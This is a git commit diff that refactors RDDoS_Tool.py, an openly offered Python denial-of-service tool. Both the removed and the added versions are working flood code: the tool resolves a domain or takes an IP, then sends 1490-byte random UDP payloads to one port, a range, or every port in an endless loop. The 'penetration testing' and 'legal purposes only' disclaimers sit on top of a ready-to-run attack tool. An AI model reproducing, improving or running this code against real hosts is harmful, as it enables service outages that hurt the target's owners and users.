37589834f7c9d19df872d85340c5be2caeaeb1db
Felipe <65371336+mrfelpa@users.noreply.github.com>
2024-10-24 15:50:35 +0000

    ImprovementsImplementedinTheCodeSructure

--- RDDoS_Tool.py
+++ RDDoS_Tool.py
@@ -5,149 +5,130 @@ Distributed under the MIT License (MIT) (See accompanying file LICENSE.txt
 or copy at http://opensource.org/licenses/MIT)
 """
 
-# Import.
-from   platform import system
-from   tqdm.auto import tqdm
+from platform import system
+from tqdm.auto import tqdm
 import os
 import time
 import random
 import socket
-import pyfiglet
+import logging
 
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Version.
-version = "1.2"
+version = "1.4"
 
+def clear_screen():
+    os.system('cls' if system() == 'Windows' else 'clear')
 
-# Platform info
-uname=system()
+def display_header():
 
-if uname == "Windows":
-    cmd_clear_clear = 'cls'
-else:
-    cmd_clear = 'clear'
+    clear_screen()
+    print(f"\033[91m   _____ \033[0m         \033[95m  ______    ______         __ \033[0m     ______)        Version: {version}")       
+    print("\033[91m  (, /   )      /)\033[0m \033[95m(, /    ) (, /    )   (__/  )\033[0m    (, /        /)") 
+    print("\033[91m    /__ /  _  _(/\033[0m  \033[95m  /    /    /    / ___  /     \033[0m     /  ______// ")
+    print("\033[91m ) /   \\__(/_(_(_\033[0m\033[95m  _/___ /_  _/___ /_(_)) /     \033[0m   ) /  (_)(_)(/_")
+    print("\033[91m(_/\033[0m              \033[95m(_/___ /  (_/___ /    (_/      \033[0m  (_/\n")
+    print("                        Author: Mr.\033[91mRed\033[0m")
+    print("       Github: https://github.com/Red-company/RDDoS_Tool")
+    print('                   For legal purposes only')
+    print("\033[92;1m")
+    print("1. Website Domain\n2. IP Address\n3. About\n4. Exit")
+    print('\033[0m')
 
-os.system(cmd_clear)
+def get_ip_by_domain(domain):
+    try:
+        ip = socket.gethostbyname(domain)
+        return ip
+    except socket.gaierror:
+        logging.error(f"Could not resolve the domain: {domain}")
+        return None
 
+def display_about():
 
-# Socket
-sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+    print("RedDDoS Tool is an open-source penetration testing tool.")
+    print("Use it to ethically test networks/servers/devices.")
+    print("\nThe author of the program is not responsible for misuse. Use only in legal cases.")
+    input("\nPress Enter to continue...")
 
+def select_target():
 
-# RDDoS_Tool
-while True:
-    # UI.
-    print("\033[91m   _____ \033[0m         \033[95m  ______    ______         __ \033[0m     ______)        Version: " + version)       
-    print("\033[91m  (, /   )      /)\033[0m \033[95m(, /    ) (, /    )   (__/  )\033[0m    (, /        /)") 
-    print("\033[91m    /__ /  _  _(/\033[0m  \033[95m  /    /    /    / ___  /     \033[0m     /  ______// ")
-    print("\033[91m ) /   \\__(/_(_(_\033[0m\033[95m  _/___ /_  _/___ /_(_)) /     \033[0m   ) /  (_)(_)(/_")
-    print("\033[91m(_/\033[0m              \033[95m(_/___ /  (_/___ /    (_/      \033[0m  (_/\n")
-    print("                        Author: Mr.\033[91mRed\033[0m")
-    print("       Github: https://github.com/Red-company/RDDoS_Tool")
-    print('                   For legal purposes only')
-    print("\033[92;1m")
-    print("1. Website Domain\n2. IP Address\n3. About\n4. Exit")
-    print('\033[0m')
+    while True:
+        opt = input("\nSelect the option (1, 2, 3 or 4): ").strip()
+        if opt == '1':
+            domain = input("Enter the domain: ").strip()
+            ip = get_ip_by_domain(domain)
+            if ip:
+                return ip
+        elif opt == '2':
+            ip = input("Enter the IP address: ").strip()
+            return ip
+        elif opt == '3':
+            display_about()
+            display_header()
+        elif opt == '4':
+            print("Exiting...")
+            exit()
+        else:
+            logging.warning("Invalid choice! Please try again.")
 
-    # Input.
-    opt = str(input("\n> "))
+def select_ports():
+    while True:
+        port_mode = input("Do you want to specify a port or range? [y/n]: ").strip().lower()
+        if port_mode == 'y':
+            while True:
+                try:
+                    ports = input("Enter the port or range (e.g., 80 or 100-200): ").strip()
+                    if '-' in ports:
+                        start_port, end_port = map(int, ports.split('-'))
+                        if 2 <= start_port <= 65534 and 2 <= end_port <= 65534 and start_port <= end_port:
+                            return range(start_port, end_port + 1)
+                        else:
+                            print("Invalid port range! Enter values between 2 and 65534.")
+                    else:
+                        port = int(ports)
+                        if 2 <= port <= 65534:
+                            return [port]
+                        else:
+                            print("Invalid port! Enter a value between 2 and 65534.")
+                except ValueError:
+                    print("Invalid input! Enter a valid number or range.")
+        elif port_mode == 'n':
+            return None
+        else:
+            logging.warning("Invalid choice! Please try again.")
 
-    # Selection.
-    if opt == '1':
-        domain = str(input("Domain:"))
-        ip = socket.gethostbyname(domain)
-        break
+def perform_attack(ip, ports=None):
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        payload = random._urandom(1490)
+        sent = 0
 
-    elif opt == '2':
-        ip = str(input("IP Address: "))
-        break
+        try:
+            while True:
+                if ports:
+                    for port in ports:
+                        sock.sendto(payload, (ip, port))
+                        logging.info(f"Sent {sent + 1} packets to {ip} through port: {port}")
+                        sent += 1
+                else:
+                    for current_port in range(1, 65535):
+                        sock.sendto(payload, (ip, current_port))
+                        logging.info(f"Sent {sent + 1} packets to {ip} through port: {current_port}")
+                        sent += 1
+        except KeyboardInterrupt:
+            logging.info("Attack interrupted by user.")
+        except Exception as e:
+            logging.error(f"An error occurred: {e}")
 
-    elif opt == '3':
-        print("\n\033[101mEasy.       .سهل\033[0m  \033[101m       \033[0m  \033[101m        \033[0m \033[101m       \033[0m \033[0m                \033[92m_____\033[0m")
-        print("                  \033[101m   \033[0m  \033[101m   \033[0m \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m\033[0m             \033[92m.-'     '-.\033[0m")
-        print("\033[101mOpen.      .افتح\033[0m  \033[101m       \033[0m  \033[101m      \033[0m   \033[101m   \033[0m  \033[101m   \033[0m           \033[92m.'\033[91m____\033[0m secure\033[92m'.\033[0m")
-        print("                  \033[101m   \033[0m \033[101m   \033[0m  \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m          \033[92m/  \033[91m|  _ \\\033[0m  \033[93m__\033[0m   \033[92m\\\033[0m")
-        print("\033[101mSecure.    .يؤمن\033[0m  \033[101m   \033[0m  \033[101m   \033[0m \033[101m        \033[0m \033[101m       \033[0m          \033[92m;\033[0m r \033[91m| |_) /\033[0m\033[93m/ o\\\033[0m t \033[92m;\033[0m")
-        print("                                                     \033[92m|\033[0m e \033[91m|  _ <\033[0m \033[93m\\__/\033[0m e \033[92m|\033[0m")
-        print("RedDDoS Tool is an open source tool for              \033[92m;\033[0m d \033[91m|_| \\ \\\033[0m \033[93m<|\033[0m  a \033[92m;\033[0m")
-        print("penetration. You can test networks/servers/any        \033[92m\\       \033[91m\\/\033[0m \033[93m<|\033[0m  m\033[92m/\033[0m")
-        print("other devices with it.                                 \033[92m'.\033[0m member \033[93m<|\033[0m \033[92m.'\033[0m")
-        print("                                                         \033[92m'-._____.-'\033[0m")
-        print("Author of the program is not responsible for")
-        print("it's usage, everybody MUST use it ONLY in         member-id: 'rst-00000002'")
-        print("legit cases.")
-        print("\nFor more information visit project's site.")
-        
-        goon = input("\n\n\n\n\n\n\nPress Enter to continue.")
-        os.system(cmd_clear)
+def main():
+    display_header()
+    ip = select_target()
+    ports = select_ports()
+    clear_screen()
+    print("\033[36;2mINITIALIZING....")
+    time.sleep(1)
+    print("STARTING ATTACK...")
+    time.sleep(2)
+    perform_attack(ip, ports)
 
-    elif opt == '4':
-        exit()
-
-    else:
-        print('\033[91mInvaild Choice!\033[0m')
-        time.sleep(2)
-        os.system(cmd_clear)
-
-# Port selection.
-port_mode = False # If 'False' all ports will be use, if 'True' - certain.
-port = 2
-
-while 1:
-    port_bool = str(input("Certain port? [y/n]: "))
-
-    if (port_bool == "y") or (port_bool == "Y"):
-        port_mode = True
-        port = int(input("Port: "))
-        break
-
-    elif (port_bool == "n") or (port_bool == "N"):
-        break
-
-    else:
-        print('\033[91mInvaild Choice!\033[0m')
-        time.sleep(2)
-
-# Starting working.
-os.system(cmd_clear)
-print('\033[36;2mINITIALIZING....')
-time.sleep(1)
-print('STARTING...')
-time.sleep(4)
-
-sent = 0
-
-if port_mode == False:  # All ports.
-    try:
-        while True:
-            if port == 65534:
-                port = 1
-
-            elif port == 1900:
-                port = 1901
-
-            sock.sendto(bytes, (ip, port))
-            sent += 1
-            port += 1
-            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
-    except:
-        print('\n\033[31;1mExited\033[0m')
-
-elif port_mode == True: # Certain port.
-    if port < 2:
-        port = 2
-        
-    elif port == 65534:
-        port = 2
-
-    elif port == 1900:
-        port = 1901
-
-    try:
-        while True:
-            sock.sendto(bytes, (ip, port))
-            sent += 1
-            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
-    except:
-        print('\n\033[31;1mExited\033[0m')
+if __name__ == '__main__':
+    main()
